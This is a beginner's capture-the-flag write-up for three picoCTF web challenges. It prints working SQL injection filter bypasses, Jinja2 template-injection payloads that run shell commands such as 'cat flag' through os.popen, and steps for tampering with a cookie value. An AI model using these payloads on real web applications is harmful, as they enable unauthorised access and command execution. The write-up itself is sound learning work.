# Web Exploitation

# 1. Web Gauntlet
Can you beat the filters?
Additional details will be available after launching your challenge instance

Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:63217/ http://shape-facility.picoctf.net:63217/filter.php

## Solution:
started with opening both the sites. being very new to any kind of webex and having zero experience i had no clue where to start. i entered any random fields in the username and password, and got the message 
``` SELECT * FROM users WHERE username='dhruv' AND password='pass' ```
some learning later i figured out this was sql, and learning more on this made me put on the tangent of sql attacks. after looking at the filter websites, i realised the website filtered the word 'or' for the first round, which was a big hint. 
now
using the command ``` ' || '1'='1 ``` caused the website to crash
putting other sql commands gave a sqlite error, making me realise the website is in sqlite and not sql

next, i typed ```dhruv '-- ``` gave me invalid username/password. this made me realise my commenting out the password worked. as username are usually admin, i typed out ``` admin'-- ``` in the admin field and gibberish in the password. this worked promoting me to round 2.

round 2 had the filter ``` Round2: or and like = -- ```. i had to use something different than or and --. as im not familiar with sql, i used gpt, which gave me the prompt ``` admin'/* ```. this promoted me to round 3.

round 3 had the filter ``` Round3: or and = like > < -- ```
using ``` admin'/* ``` promoted me to round 4

round 4 had the filter ```Round4: or and = like > < -- admin```. now i couldnt use admin aswell. this was tricky. i tried concatenating the phrase admin using ``` a'||'d'||'m'||'i'||'n''; ``` which worked. the same worked for round 5 giving me the flag

## Flag: 
picoCTF{y0u_m4d3_1t_79a0ddc6}

## Concepts Learnt: 
sql injection

## Notes:

## Resources:  

# 2. SSTI1
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:
the hint suggested SSTI. i tried inputting ```{{ 7 * '7' }}``` which printed 7777777. this gave a good starting idea. as this ran, i learnt the site is using jinja2 as its template engine. i now looked up jinja2 payloads
trying ```{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }} ``` gave me an error, maybe because catch warnings didnt exist. i tried using
however, now using ``` {{ ''.__class__.__base__.__subclasses__() }} ``` giving me all the classes the application has access to
examining the code gave me a clue on what to type next:
``` {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }} ``` running through the popen class. this listed out the contents. ``` __pycache__ app.py flag requirements.txt ```
ran the flag file using ``` {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }} ```
this gave me the flag


## Flag: 
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}

## Concepts Learnt: 
SSTI INJECTION

## Notes:

## Resources: 

# 3. Cookies
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/
 

## Solution:
opened up the cookies tab. changed it to admin. didnt work. changed value to 1. it gave an output. kept hit and trialing till i reached cookie value 18 giving me the flag.

## Flag: 
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

## Concepts Learnt: 
cookies and how to exploit

## Notes:

## Resources: 